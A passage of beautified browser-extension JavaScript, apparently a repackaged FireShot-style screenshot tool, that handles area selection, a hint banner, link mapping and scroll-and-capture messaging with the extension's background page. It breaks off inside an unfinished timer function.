                    wrapper.addEventListener("mousemove", wrapperMouseMove, false);
                    wrapper.addEventListener("touchmove", wrapperMouseMove, {
                        passive: true
                    });
                    doc.addEventListener("mouseup", wrapperMouseUp, false);
                    doc.addEventListener("touchend", wrapperMouseUp, {
                        passive: true
                    });
                    doc.addEventListener("touchcancel", wrapperMouseUp, {
                        passive: true
                    });
                }
                if (e.constructor.name !== "TouchEvent") e.preventDefault();
                return true;
            }
            function onKeyDown(e) {
                if (e.keyCode == 27) {
                    x1 = 0;
                    y1 = 0;
                    x2 = 0;
                    y2 = 0;
                    selectedElement = undefined;
                    clearAutoScrollTmr();
                    completed();
                }
                if (!ctrlKey && e.ctrlKey) {
                    ctrlKey = true;
                    update();
                }
            }
            function onKeyUp(e) {
                ctrlKey = e.ctrlKey;
                update();
            }
            function calcSelectionRect() {
                var left = Math.min(x1, x2), top = Math.min(y1, y2), width = Math.abs(x2 - x1), height = Math.abs(y2 - y1);
                if (!selectedElement && ctrlKey) {
                    height = width;
                    if (y2 < y1) top = y1 - height;
                }
                return {
                    left: left,
                    top: top,
                    width: width,
                    height: height
                };
            }
            function repositionHelper() {
                var margin = "10px";
                info.style.top = y2 <= y1 ? margin : "";
                info.style.bottom = y2 > y1 ? margin : "";
                info.style.left = x2 <= x1 ? margin : "";
                info.style.right = x2 > x1 ? margin : "";
            }
            function update() {
                if (destroyed) return;
                var docWidth = Math.max(doc.documentElement.scrollWidth, doc.body.scrollWidth);
                var docHeight = Math.max(doc.documentElement.scrollHeight, doc.body.scrollHeight);
                var s = calcSelectionRect();
                if (selectedElement && (!extendedMode || !ctrlKey)) {
                    s.left = s.top = s.width = s.height = 0;
                }
                holder.style.left = s.left + "px";
                holder.style.top = s.top + "px";
                holder.style.width = s.width + "px";
                holder.style.height = s.height + "px";
                wrapper.style.width = docWidth + "px";
                wrapper.style.height = docHeight + "px";
                outer[0].style.left = 0 + "px";
                outer[0].style.top = 0 + "px";
                outer[0].style.width = docWidth + "px";
                outer[0].style.height = holder.style.top;
                outer[1].style.left = 0 + "px";
                outer[1].style.top = s.top + s.height + "px";
                outer[1].style.width = docWidth + "px";
                outer[1].style.height = docHeight - (s.top + s.height) + "px";
                outer[2].style.left = 0 + "px";
                outer[2].style.top = s.top + "px";
                outer[2].style.width = s.left + "px";
                outer[2].style.height = s.height + "px";
                outer[3].style.left = s.left + s.width + "px";
                outer[3].style.top = s.top + "px";
                outer[3].style.width = docWidth - (s.left + s.width) + "px";
                outer[3].style.height = s.height + "px";
                for (var i = 0; i < 4; i++) {
                    borders[i].style.left = 0 + "px";
                    borders[i].style.top = 0 + "px";
                    borders[i].style.right = 0 + "px";
                    borders[i].style.bottom = 0 + "px";
                }
                repositionHelper();
                if (selectedElement && scrolledElementExists(selectedElement)) {
                    var dimensions = Math.round(selectedElement.scrollWidth) + " x " + Math.round(selectedElement.scrollHeight), imgHTML = "<img src='" + animatedImgDataURL + "' width='16' height='16'/>";
                    info.innerHTML = imgHTML + " Scroll and capture: " + dimensions;
                    if (info.scrollWidth + 11 > s.width || info.scrollHeight + 11 > s.height) info.innerHTML = imgHTML;
                } else info.innerHTML = Math.round(s.width) + " x " + Math.round(s.height);
                info.style.visibility = info.scrollWidth + 11 < s.width && info.scrollHeight + 11 < s.height ? "visible" : "hidden";
            }
            function completed() {
                if (destroyed) return;
                destroyed = true;
                wrapper.removeEventListener("mousedown", wrapperMouseDown, true);
                doc.removeEventListener("keydown", onKeyDown, false);
                doc.removeEventListener("keyup", onKeyUp, false);
                doc.body.removeChild(holder);
                doc.body.removeChild(wrapper);
                highlightScrollableElements(false);
                for (var i = 0; i < 4; i++) {
                    doc.body.removeChild(outer[i]);
                }
                if (selectedElement) {
                    var rect = getElementRect(selectedElement, doc);
                    x1 = rect.left;
                    y1 = rect.top;
                    x2 = rect.left + rect.width;
                    y2 = rect.top + rect.height;
                }
                var s = calcSelectionRect();
                if (onSelected) {
                    onSelected({
                        selectedElement: selectedElement,
                        isScrollable: selectedElement ? isScrollableStyle(doc.defaultView.getComputedStyle(selectedElement, "")) : false,
                        left: s.left,
                        top: s.top,
                        right: s.left + s.width,
                        bottom: s.top + s.height
                    });
                }
            }
            return {
                makeSelection: function makeSelection(onSelectedCB) {
                    onSelected = onSelectedCB;
                    init();
                    getScrollableElements();
                    highlightScrollableElements(true);
                    createHTMLHelpers();
                    update();
                    wrapper.addEventListener("mousedown", wrapperMouseDown, true);
                    wrapper.addEventListener("mousemove", selectElementMouseMove, true);
                    wrapper.addEventListener("touchstart", wrapperMouseDown, {
                        passive: true
                    });
                    doc.addEventListener("keydown", onKeyDown, false);
                    doc.addEventListener("keyup", onKeyUp, false);
                }
            };
        };
        jtdsAddon.FSSelectionHint = function(docElement) {
            var cMessageContainerId = "FireShot.topMessageHolder", doc = docElement;
            return {
                show: function show() {
                    var holder = doc.createElement("div");
                    holder.id = cMessageContainerId;
                    holder.style.cssText = "display:block; opacity:0; border:1px solid #666; background:#fff; z-index:2147483647; font-family: Tahoma; text-align: left; font-size:20px; color: #000; margin:0; padding:10px; width:100%;  left:0px; right:0px; top:0px; position:fixed";
                    holder.innerHTML = "<strong>HINT:</strong> Hold the CTRL key to capture specific HTML element or scrolling area. &#160;";
                    holder.innerHTML += "<a target='_blank' style='color:#08c' href='http://getfireshot.com/demos/selection.php'>View demo</a>";
                    holder.innerHTML += " | ";
                    holder.innerHTML += "<a style='color:#08c' href='#' onclick = 'document.body.removeChild(document.getElementById(\"" + cMessageContainerId + "\")); return false;'>Close</a>";
                    doc.body.appendChild(holder);
                    var opacity = 0;
                    function setOpacity() {
                        opacity += .1;
                        holder.style.opacity = opacity;
                        if (opacity < 1) setTimeout(setOpacity, 30);
                    }
                    setTimeout(setOpacity, 300);
                },
                hide: function hide() {
                    var element = doc.getElementById(cMessageContainerId);
                    if (element) doc.body.removeChild(element);
                },
                isShown: function isShown() {
                    return doc.getElementById(cMessageContainerId) !== null;
                }
            };
        };
        return jtdsAddon;
    });
})(com.jtds.jtds);

(function(R) {
    R.define("fsLink", [ "jquery", "common", "constants" ], function($, common, C) {
        function rectsIntersected(a, b) {
            return a.left < b.left + b.width && b.left < a.left + a.width && a.top < b.top + b.height && b.top < a.top + a.height;
        }
        function LinksGrabber(k) {
            var l = document, t = k == document ? document.scrollingElement : k, u = function u(a, d) {
                var b = a.getBoundingClientRect();
                return {
                    top: Math.round(b.top + (window.pageYOffset || t.scrollTop)),
                    left: Math.round(b.left + (window.pageXOffset || t.scrollLeft)),
                    width: b.width,
                    height: b.height
                };
            };
            return {
                collectedLinks: [],
                markHiddenLinks: function markHiddenLinks() {
                    for (var a = [], d = l.createNodeIterator(k, NodeFilter.SHOW_ELEMENT, null, !1), b; b = d.nextNode(); ) {
                        if (b.childElementCount && "HTML" !== b.tagName && b !== k && (b.offsetHeight < b.scrollHeight || b.offsetWidth < b.scrollWidth)) {
                            var f = l.defaultView.getComputedStyle(b, "");
                            !f || "none" === f.getPropertyValue("display") || "hidden" !== f.getPropertyValue("overflow") && "hidden" !== f.getPropertyValue("overflow-y") && "auto" !== f.getPropertyValue("overflow-y") && "scroll" != f.getPropertyValue("overflow-y") && "hidden" !== f.getPropertyValue("overflow-x") && "auto" !== f.getPropertyValue("overflow-x") && "scroll" != f.getPropertyValue("overflow-x") || a.push(b);
                        }
                    }
                    a.forEach(function(a) {
                        var b = u(a, k);
                        a = a.getElementsByTagName("a");
                        for (var d = 0, e = 0; e < a.length; ++e) {
                            var n = a[e], p = u(n, k);
                            rectsIntersected(b, p) || (n.setAttribute("__fireshotHiddenLink", 1), ++d);
                        }
                    });
                },
                createLinksSnapshot: function createLinksSnapshot() {
                    function a(a) {
                        if (a.getAttribute("__fireshotHiddenLink")) return !1;
                        var b = a.href;
                        if (b = b && "" !== b && "javascript:void(0)" !== b && b.slice && "#" !== b.slice(-1)) {
                            a: {
                                for (;a && a != l; ) {
                                    b = l.defaultView.getComputedStyle(a, "");
                                    if ("hidden" === b.visibility || "none" === b.display || 0 == b.opacity) {
                                        a = !0;
                                        break a;
                                    }
                                    a = a.parentNode;
                                }
                                a = !1;
                            }
                            b = !a;
                        }
                        return b;
                    }
                    function d(a, b) {
                        var e = u(a, k), c = a.getClientRects(), d = void 0;
                        if (1 === c.length) {
                            var g;
                            if (c = a.children && 0 < a.children.length && "IMG" === a.children[0].tagName) c = l.defaultView.getComputedStyle(a, ""), 
                            c = !c || "hidden" !== c.getPropertyValue("overflow") && "hidden" !== c.getPropertyValue("overflow-y") && "auto" !== c.getPropertyValue("overflow-y") && "scroll" != c.getPropertyValue("overflow-y") && "hidden" !== c.getPropertyValue("overflow-x") && "auto" !== c.getPropertyValue("overflow-x") && "scroll" != c.getPropertyValue("overflow-x") ? u(a.children[0], k) : void 0, 
                            c = g = c;
                            c ? b.push(g) : b.push(e);
                        } else {
                            for (g = 0; g < c.length; ++g) {
                                0 === g ? d = {
                                    left: c[g].left,
                                    top: c[g].top
                                } : (c[g].left < d.left && (d.left = c[g].left), c[g].top < d.top && (d.top = c[g].top));
                            }
                            if (d) {
                                var f = e.left - d.left, e = e.top - d.top;
                                for (g = 0; g < c.length; ++g) {
                                    b.push({
                                        left: c[g].left + f,
                                        top: c[g].top + e,
                                        width: c[g].width,
                                        height: c[g].height
                                    });
                                }
                            }
                        }
                    }
                    for (var b = k.getElementsByTagName("a"), f = {
                        left: 0,
                        top: 0,
                        width: window.innerWidth,
                        height: window.innerHeight
                    }, e = 0; e < b.length; ++e) {
                        var h = b[e];
                        if (a(h)) {
                            var r = h.getBoundingClientRect();
                            if (rectsIntersected(r, f) && (r = [], d(h, r), 0 !== r.length)) {
                                var m = h.getAttribute("__fireshotLinkId");
                                m ? m = parseInt(m) : (m = this.collectedLinks.length, h.setAttribute("__fireshotLinkId", m));
                                this.collectedLinks[m] = {
                                    e: h,
                                    r: r
                                };
                            }
                        }
                    }
                },
                getLinks: function getLinks(a, d) {
                    var b = a.crop ? a.cropRight - a.cropLeft : a.width, f = a.crop ? a.cropBottom - a.cropTop : a.height;
                    a.links = [];
                    for (var e = 0; e < this.collectedLinks.length; ++e) {
                        var h = this.collectedLinks[e], k = this.collectedLinks[e].e;
                        if (!k.getAttribute("__fireshotHiddenLink")) {
                            for (var m = [], n = 0; n < h.r.length; ++n) {
                                var p = h.r[n].left - d.x, q = h.r[n].top - d.y, c = h.r[n].width, l = h.r[n].height;
                                p >= b || q >= f || (0 > p && (c += p, p = 0), 0 > q && (l += q, q = 0), p + c > b && (c = b - p), 
                                q + l > f && (l = f - q), 0 < c && 0 < l && m.push([ Math.round(p * a.ratioW), Math.round(q * a.ratioH), Math.round(c * a.ratioW), Math.round(l * a.ratioH) ]));
                            }
                            0 < m.length && a.links.push({
                                a: k.href,
                                r: m,
                                h: ""
                            });
                        }
                    }
                },
                checkClickableLinks: function checkClickableLinks() {
                    for (var a, d, b = t.scrollLeft, f = t.scrollTop, e = 0; e < this.collectedLinks.length; ++e) {
                        if (!this.collectedLinks[e].p) {
                            a = this.collectedLinks[e].r[0].left - b;
                            d = this.collectedLinks[e].r[0].top - f;
                            0 > a && (a += this.collectedLinks[e].r[0].width);
                            0 > d && (d += this.collectedLinks[e].r[0].height);
                            var h;
                            0 <= d && d <= window.innerHeight && 0 <= a && a <= window.innerWidth && ((h = document.elementFromPoint(Math.round(a + .5), Math.round(d + .5))) === this.collectedLinks[e].e || h && this.collectedLinks[e].e.contains(h) || this.collectedLinks[e].e.setAttribute("__fireshotHiddenLink", 1));
                        }
                    }
                },
                clearAttributes: function clearAttributes() {
                    for (var a = k.getElementsByTagName("a"), d = 0; d < a.length; ++d) {
                        a[d].removeAttribute("__fireshotHiddenLink"), a[d].removeAttribute("__fireshotLinkId");
                    }
                }
            };
        }
        return {
            linksGrabber: LinksGrabber
        };
    });
})(com.jtds.jtds);

(function(R) {
    R.define("lv0", [ "jquery", "common", "constants", "jtdsAddon", "fsLink" ], function($, common, C, jtdsAddon, fsLink) {
        var scriptLoaded = true, stubbornNodes = [], modifiedNodes2 = [], commPortName, options = undefined, sbStyle = undefined;
        !chrome.runtime.sendMessage || chrome.runtime.sendMessage({
            message: "getPortName"
        }, function(response) {
            commPortName = response.portName;
        });
        function enableSomeElements(enable) {
            if (typeof enable === "undefined") enable = true;
            var elem;
            if (window.location.href.match(/https?:\/\/mail\.google\.com/i)) {
                var itr = document.createNodeIterator(document.documentElement, NodeFilter.SHOW_ELEMENT, null, false);
                var currentNode;
                while (currentNode = itr.nextNode()) {
                    if (currentNode.nodeName == "TD" && currentNode.getAttribute("class") && currentNode.getAttribute("class").match(/Bu y3/i)) {
                        currentNode.style.setProperty("display", enable ? "" : "none", "important");
                    }
                }
                if (elem = document.getElementById(":ro")) elem.style.setProperty("display", enable ? "" : "none", "important");
                if (elem = document.getElementById(":5")) elem.style.setProperty("display", enable ? "" : "none", "important");
            }
        }
        function hideStubbornElements(root, horzMoving) {
            function elementExists(elem) {
                for (var i = 0; i < stubbornNodes.length; ++i) {
                    if (stubbornNodes[i].elem === elem) return true;
                }
                return false;
            }
            horzMoving = horzMoving || false;
            var itr = document.createNodeIterator(document.documentElement, NodeFilter.SHOW_ELEMENT, null, false), current;
            while (current = itr.nextNode()) {
                var style = document.defaultView.getComputedStyle(current, "");
                if (style && style.getPropertyValue("position") == "fixed" && !elementExists(current) && style.getPropertyValue("display") != "none") {
                    if (root && isChildOf(current, root)) continue;
                    if (horzMoving && current.scrollWidth > window.innerWidth) continue;
                    if (current.scrollWidth > window.innerWidth * .9 && current.scrollHeight > window.innerHeight * .9) continue;
                    stubbornNodes.push({
                        elem: current,
                        opacity: style.getPropertyValue("opacity")
                    });
                }
            }
            for (var i = 0; i < stubbornNodes.length; ++i) {
                stubbornNodes[i].elem.style.setProperty("opacity", "0");
            }
        }
        function showStubbornElements() {
            for (var i = 0; i < stubbornNodes.length; ++i) {
                stubbornNodes[i].elem.style.setProperty("opacity", stubbornNodes[i].opacity);
            }
        }
        function getAltExtents() {
            var doc = window.document;
            var root = doc.documentElement;
            var canvas_width = root.clientWidth ? root.clientWidth : window.innerWidth;
            var canvas_height = -1;
            if (canvas_height < 0) canvas_height = window.innerHeight - getSBHeight(window);
            if (doc.body) {
                var altWidth = doc.compatMode == "CSS1Compat" ? doc.documentElement.scrollWidth : doc.body.scrollWidth;
                var altHeight = doc.documentElement.scrollHeight;
                var frameWidth = doc.compatMode == "CSS1Compat" ? doc.documentElement.clientWidth : doc.body.clientWidth;
                var frameHeight = doc.compatMode == "CSS1Compat" ? doc.documentElement.clientHeight : doc.body.clientHeight;
                if (altWidth < frameWidth) {
                    altWidth = frameWidth;
                }
                if (altHeight < frameHeight) {
                    altHeight = frameHeight;
                }
                if (canvas_width < altWidth) {
                    canvas_width = altWidth;
                }
                if (canvas_height < altHeight) {
                    canvas_height = altHeight;
                }
            }
            return {
                Width: canvas_width,
                Height: canvas_height
            };
        }
        function findScrolledElement(docWidth, docHeight) {
            var curDoc = document, divTags = curDoc.getElementsByTagName("div"), bestElem, loc = location.href;
            for (var i = 0; i < divTags.length; i++) {
                var elem = divTags[i];
                if (elem.scrollWidth > 0 && elem.scrollHeight > 0 && (elem.scrollWidth > elem.clientWidth || elem.scrollHeight > elem.clientHeight) && (loc.match(/https?:\/\/www\.(facebook|fb)\.com/i) && elem.scrollHeight > docHeight * .5 || elem.scrollWidth > docWidth && elem.scrollHeight > docHeight * .5 || elem.scrollHeight > docHeight && elem.scrollWidth > docWidth * .5 || elem.clientWidth > docWidth * .7 && elem.clientHeight > docHeight * .7)) {
                    var style = curDoc.defaultView.getComputedStyle(elem, "");
                    if (isScrollableStyle(style) && (!bestElem || bestElem.scrollWidth * bestElem.scrollHeight < elem.scrollWidth * elem.scrollHeight)) {
                        var ext = getElementExtents(elem);
                        if (ext.absoluteX + ext.w <= window.innerWidth && ext.absoluteY + ext.h <= window.innerHeight) bestElem = elem;
                    }
                }
            }
            return bestElem;
        }
        function getElementExtents(element) {
            var rects = element.getClientRects(), extents = {
                absoluteX: 0,
                absoluteY: 0,
                x: 0,
                y: 0,
                w: 0,
                h: 0
            };
            if (rects.length > 0) {
                extents.absoluteX = element.clientLeft + rects[0].left;
                extents.absoluteY = element.clientTop + rects[0].top;
                extents.w = rects[0].width;
                extents.h = rects[0].height;
            }
            return extents;
        }
        function disableFloatingInView(parent) {
            var curDoc = document, ext = getElementExtents(parent);
            modifiedNodes2 = [];
            var itr = curDoc.createNodeIterator(curDoc.documentElement, NodeFilter.SHOW_ELEMENT, null, false), current;
            while ((current = itr.nextNode()) != null) {
                var style = curDoc.defaultView.getComputedStyle(current, "");
                if (style && style.getPropertyValue("opacity") !== "0" && (style.getPropertyValue("position") == "absolute" || style.getPropertyValue("position") == "relative")) {
                    var elemExt = getElementExtents(current);
                    if (current != parent && getIntersection(ext.absoluteX, ext.absoluteY, ext.w, ext.h, elemExt.absoluteX, elemExt.absoluteY, elemExt.w, elemExt.h) && !isChildOf(parent, current) && !isChildOf(current, parent)) {
                        modifiedNodes2.push({
                            object: current,
                            opacity: style.getPropertyValue("opacity")
                        });
                        current.style.setProperty("opacity", "0", "important");
                    }
                }
            }
        }
        function enableFloatingInView() {
            for (var i = 0; i < this.modifiedNodes2.length; i++) {
                modifiedNodes2[i].object.style.setProperty("opacity", modifiedNodes2[i].opacity);
            }
        }
        function getOffsets(msg, mode, cropRect) {
            var offsets = {
                x: 0,
                y: 0
            };
            if (mode === cModeVisible) {
                offsets.x = document.scrollingElement.scrollLeft;
                offsets.y = document.scrollingElement.scrollTop;
            } else if (mode === cModeSelected) {
                offsets.x = cropRect.left;
                offsets.y = cropRect.top;
            } else if (msg.div) {
                offsets.x = msg.left;
                offsets.y = msg.top;
            }
            return offsets;
        }
        chrome.runtime.onConnect.addListener(function(port) {
            if (chrome.runtime.sendMessage && port.name != commPortName) {
                return;
            }
            var firstTime = true, frameMode = false, isEmulation = window.navigator.plugins.length === 0, rows = 1, cols = 1, mode = 0, timeout = 0, ratioW = 1, ratioH = 1, horzMoving = true, vertMoving = true, clientWidth = 0, clientHeight = 0, scrollStart = {
                left: 0,
                top: 0
            }, scrollEnd = {
                left: 0,
                top: 0
            }, cropRect = {
                left: 0,
                top: 0,
                right: 0,
                bottom: 0
            }, divElement, doc, body, docScroll, savedScrollTop, savedScrollLeft, fStylesModified, savedOFStyle, savedHeightStyle, savedBodyOFStyle, docWidth, docHeight, savedZIndex, p, linksGrabber, fNative;
            stubbornNodes = [];
            modifiedNodes2 = [];
            function initGrabber(grabMode, root) {
                divElement = root;
                mode = grabMode;
                if (mode == cModeEntire && !divElement && !frameMode) divElement = findScrolledElement(doc.scrollingElement.scrollWidth, doc.scrollingElement.scrollHeight);
                body = divElement || doc.body;
                docScroll = divElement || doc.scrollingElement;
                if (divElement) {
                    divElement.scrollIntoView();
                    disableFloatingInView(divElement);
                    savedZIndex = divElement.style.zIndex;
                    divElement.style.zIndex = 2147483647;
                }
                savedScrollTop = docScroll.scrollTop;
                savedScrollLeft = docScroll.scrollLeft;
                docWidth = docScroll.scrollWidth;
                docHeight = docScroll.scrollHeight;
                if (!divElement) {
                    if (document.defaultView.getComputedStyle(document.body, "").overflowX === "hidden") {
                        savedBodyOFStyle = body.style.overflowX;
                        var t = docScroll.scrollHeight;
                        body.style.overflowX = "visible";
                        if (t >= docScroll.scrollHeight) {
                            body.style.overflowX = savedBodyOFStyle;
                            savedBodyOFStyle = undefined;
                        }
                    }
                    docWidth = Math.max(doc.documentElement.scrollWidth, body.scrollWidth, document.documentElement.clientWidth, body.offsetWidth, document.documentElement.offsetWidth);
                    docHeight = Math.max(doc.documentElement.scrollHeight, body.scrollHeight, document.documentElement.clientHeight, body.offsetHeight, document.documentElement.offsetHeight);
                    if (docWidth <= 0 || docHeight <= 0) {
                        var e = getAltExtents();
                        docWidth = e.Width;
                        docHeight = e.Height;
                    }
                    if (docWidth <= 0) docWidth = 1024;
                    if (docHeight <= 0) docHeight = 768;
                }
                if (mode === cModeEntire) {
                    if (isEmulation) {
                        docScroll.scrollTop = 1;
                        docScroll.scrollLeft = 1;
                        setTimeout(function() {
                            docScroll.scrollTop = 0;
                            docScroll.scrollLeft = 0;
                        }, 10);
                    } else {
                        docScroll.scrollTop = 0;
                        docScroll.scrollLeft = 0;
                    }
                }
                if (mode !== cModeVisible && mode !== cModeBrowser) {
                    enableSomeElements(false);
                }
                if (divElement) {
                    clientWidth = divElement.clientWidth;
                    clientHeight = divElement.clientHeight;
                } else {
                    clientWidth = window.innerWidth;
                    clientHeight = window.innerHeight;
                    if (docWidth < window.innerWidth) docWidth = window.innerWidth;
                }
            }
            port.onMessage.addListener(function(msg) {
                switch (msg.topic) {
                  case "init":
                    p = msg.p;
                    fNative = msg.native;
                    timeout = p ? 150 : 200;
                    doc = window.document;
                    options = msg.options;
                    frameMode = msg.frameMode;
                    try {
                        initGrabber(msg.mode);
                    } catch (e) {
                        port.postMessage({
                            topic: "initAborted"
                        });
                        return;
                    }
                    if (mode !== cModeSelected && !divElement || isEmulation) {
                        fStylesModified = true;
                        savedOFStyle = docScroll.style.overflow;
                        savedHeightStyle = docScroll.style.height;
                        docScroll.style.overflow = "hidden";
                        docScroll.style.height = "initial";
                    }
                    var response = {
                        topic: "initDone",
                        url: document.location.toString(),
                        title: document.title,
                        cw: frameMode && frameElement ? frames.parent.innerWidth : window.innerWidth,
                        ch: frameMode && frameElement ? frames.parent.innerHeight : window.innerHeight,
                        emulation: isEmulation
                    };
                    if (mode === cModeEntire) {
                        setTimeout(function() {
                            docScroll.scrollTop = docHeight;
                            setTimeout(function() {
                                docScroll.scrollTop = 0;
                                setTimeout(function() {
                                    port.postMessage(response);
                                }, timeout);
                            }, timeout);
                        }, timeout);
                    } else {
                        setTimeout(function() {
                            port.postMessage(response);
                        }, timeout);
                    }
                    break;

                  case "setRatio":
                    ratioW = msg.ratioW;
                    ratioH = msg.ratioH;
                    break;

                  case "selectArea":
                    if (!document.body) {
                        alert("Apologies, this page does not support capturing selections.");
                        port.postMessage({
                            topic: "areaSelectionCanceled"
                        });
                        break;
                    }
                    hideStubbornElements();
                    var fsSelectionHint = jtdsAddon.FSSelectionHint(document);
                    if (fNative && getOptionFromScript(cShowSelectionHintPref, "true") !== "false") fsSelectionHint.show();
                    var fsSelector = jtdsAddon.FSSelector({
                        browser: "chrome",
                        extendedMode: fNative,
                        doc: document
                    });
                    fsSelector.makeSelection(function(data) {
                        if (fNative) {
                            if (fsSelectionHint.isShown()) fsSelectionHint.hide(); else setOptionFromScript(cShowSelectionHintPref, "false");
                        }
                        if (data.left == data.right || data.top == data.bottom) {
                            port.postMessage({
                                topic: "areaSelectionCanceled"
                            });
                            showStubbornElements();
                        } else {
                            if (data.isScrollable) {
                                initGrabber(cModeEntire, data.selectedElement);
                            } else {
                                docScroll.scrollLeft = data.left;
                                docScroll.scrollTop = data.top;
                                scrollStart.left = docScroll.scrollLeft;
                                scrollStart.top = docScroll.scrollTop;
                                cropRect.left = data.left;
                                cropRect.top = data.top;
                                cropRect.right = data.right;
                                cropRect.bottom = data.bottom;
                            }
                            setTimeout(function() {
                                hideStubbornElements();
                                port.postMessage({
                                    topic: "areaSelected"
                                });
                            }, timeout);
                        }
                    });
                    break;

                  case "scrollNext":
                    if (firstTime) {
                        linksGrabber = new fsLink.linksGrabber(divElement || document);
                        linksGrabber.clearAttributes();
                        linksGrabber.markHiddenLinks();
                        linksGrabber.createLinksSnapshot();
                        if (docScroll.scrollLeft === 0 && docScroll.scrollTop === 0) linksGrabber.checkClickableLinks();
                        firstTime = false;
                        setTimeout(function() {
                            port.postMessage({
                                topic: "scrollDone",
                                x: docScroll.scrollLeft * ratioW,
                                y: docScroll.scrollTop * ratioH
                            });
                        }, timeout);
                        return;
                    }
                    var savedPos;
                    if (horzMoving && mode != cModeVisible && mode != cModeBrowser) {
                        var maxWidth = mode == cModeSelected ? cropRect.right : docWidth, shift = Math.max(clientWidth - 30, 0);
                        savedPos = docScroll.scrollLeft;
                        docScroll.scrollLeft += Math.max(0, Math.min(shift, maxWidth - (docScroll.scrollLeft + shift) + 20));
                        horzMoving = docScroll.scrollLeft != savedPos && docScroll.scrollLeft < docWidth;
                        if (horzMoving) {
                            if (rows == 1) cols++;
                            setTimeout(function() {
                                hideStubbornElements(divElement, true);
                                linksGrabber.createLinksSnapshot();
                                setTimeout(function() {
                                    port.postMessage({
                                        topic: "scrollDone",
                                        x: docScroll.scrollLeft * ratioW,
                                        y: docScroll.scrollTop * ratioH
                                    });
                                }, timeout);
                            }, 0);
                            return;
                        } else if (mode == cModeSelected) scrollEnd.left = docScroll.scrollLeft;
                    }
                    if (vertMoving && mode != cModeVisible && mode != cModeBrowser) {
                        var shift = Math.max(0, clientHeight - 40);
                        savedPos = docScroll.scrollTop;
                        docScroll.scrollTop += Math.max(0, shift);
                        vertMoving = savedPos != docScroll.scrollTop && docScroll.scrollTop < docHeight;
                        if (mode == cModeSelected) {
                            vertMoving &= docScroll.scrollTop < cropRect.bottom;
                            if (!vertMoving) scrollEnd.top = savedPos;
                        }
                        if (vertMoving) {
                            rows++;
                            docScroll.scrollLeft = mode == cModeEntire ? 0 : scrollStart.left;
                            horzMoving = true;
                            setTimeout(function() {
                                hideStubbornElements(divElement);
                                linksGrabber.createLinksSnapshot();
                                setTimeout(function() {
                                    port.postMessage({
                                        topic: "scrollDone",
                                        x: docScroll.scrollLeft * ratioW,
                                        y: docScroll.scrollTop * ratioH
                                    });
                                }, timeout);
                            }, timeout);
                            return;
                        }
                    }
                    msg = {
                        topic: "scrollFinished",
                        div: 0,
                        left: 0,
                        top: 0,
                        width: mode == cModeEntire ? docWidth : clientWidth,
                        height: mode == cModeEntire ? docHeight : clientHeight,
                        ratioW: ratioW,
                        ratioH: ratioH,
                        rows: rows,
                        cols: cols,
                        cw: clientWidth,
                        ch: clientHeight,
                        hScrollbar: window.innerHeight > clientHeight,
                        vScrollBar: window.innerWidth > clientWidth
                    };
                    if (frameMode && frameElement) {
                        msg.div = 1;
                        msg.left = frameElement.clientLeft + frameElement.offsetLeft;
                        msg.top = frameElement.clientTop + frameElement.offsetTop;
                    } else if (divElement) {
                        var rects = divElement.getClientRects();
                        msg.div = 1;
                        if (rects.length > 0) {
                            msg.left = divElement.clientLeft + rects[0].left;
                            msg.top = divElement.clientTop + rects[0].top;
                        }
                        divElement.style.zIndex = savedZIndex;
                        enableFloatingInView();
                    }
                    if (mode === cModeSelected) {
                        msg.width = scrollEnd.left - scrollStart.left + clientWidth;
                        msg.height = scrollEnd.top - scrollStart.top + clientHeight;
                        msg.crop = true;
                        msg.cropLeft = cropRect.left - scrollStart.left;
                        msg.cropTop = cropRect.top - scrollStart.top;
                        msg.cropRight = msg.cropLeft + (cropRect.right - cropRect.left);
                        msg.cropBottom = msg.cropTop + (cropRect.bottom - cropRect.top);
                    }
                    var offsets = getOffsets(msg, mode, cropRect);
                    linksGrabber.getLinks(msg, offsets);
                    linksGrabber.clearAttributes();
                    linksGrabber = undefined;
                    msg.left *= ratioW;
                    msg.top *= ratioH;
                    msg.width *= ratioW;
                    msg.height *= ratioH;
                    msg.cw *= ratioW;
                    msg.ch *= ratioH;
                    msg.cropLeft *= ratioW;
                    msg.cropTop *= ratioH;
                    msg.cropRight *= ratioW;
                    msg.cropBottom *= ratioH;
                    docScroll.scrollLeft = savedScrollLeft;
                    docScroll.scrollTop = savedScrollTop;
                    if (fStylesModified) {
                        docScroll.style.overflow = savedOFStyle;
                        docScroll.style.height = savedHeightStyle;
                    }
                    if (savedBodyOFStyle !== undefined) document.body.style.overflowX = savedBodyOFStyle;
                    if (mode != cModeVisible && mode != cModeBrowser) {
                        enableSomeElements(true);
                    }
                    showStubbornElements();
                    setTimeout(function() {
                        port.postMessage(msg);
                    }, timeout);
                    break;

                  case "sendJTDSCompleteEvent":
                    if (window.fsPendingCB) {
                        var evtData = {
                            cbId: window.fsPendingCB,
                            data: msg.data
                        };
                        var event = new document.defaultView.CustomEvent("JTDSCaptureCompleteEvent", {
                            detail: evtData
                        });
                        document.dispatchEvent(event);
                    }
                    break;

                  case "showCompleteTip":
                    $("body").append("<div id='jtds-suc-tip' style='background: #000;width: 200px;height: 60px;position: fixed;top: 50%;left: 50%;font-size: 16px;text-align: center;line-height: 60px;border-radius: 5px;margin: -30px 0 0 -100px;color: #fff;opacity: 0.8;'>截图已保存</div>");
                    setTimeout(function() {
                        $("#jtds-suc-tip").remove();
                    }, 3e3);
                    break;
                }
            });
        });
        return {
            init: function init() {}
        };
    });
})(com.jtds.jtds);

(function(R) {
    R.define("app", [ "jquery", "common", "constants", "ecy" ], function($, common, C, ecy) {
        var _pg;
        var _callbacks = {};
        var _requestCount = 0;
        function requestBG(request, callback) {
            if (!window.dispatchEvent) {
                return;
            }
            var cb = [], _cache = null;
            for (var i in request) {
                if (i !== "topic" && _typeof(request[i]) !== "object") cb.push(request[i]);
            }
            cb.sort();
            cb = cb.join("_");
            cb += new Date().getTime();
            cb += "_";
            cb += ("" + Math.random()).replace(".", "");
            cb += "_";
            cb += _requestCount;
            _requestCount++;
            _callbacks[cb] = callback;
            var detail = {
                request: request,
                callback: cb
            };
            var eventPage = new CustomEvent("jtds-page", {
                detail: JSON.stringify(detail)
            });
            window.dispatchEvent(eventPage);
        }
        R.requestBG = requestBG;
        var app = {
            init: function init() {
                if (!_pg && window.addEventListener) {
                    window.addEventListener("jtds-content", function(event) {
                        var detail = JSON.parse(event.detail);
                        var resp = detail.resp;
                        var cb = detail.callback;
                        if (cb && _callbacks[cb]) {
                            _callbacks[cb](resp);
                        }
                    });
                }
                this.setParams();
            },
            setTC: function setTC() {
                var t = 3 * 60 * 1e3;
                var c = 10;
                var request = {
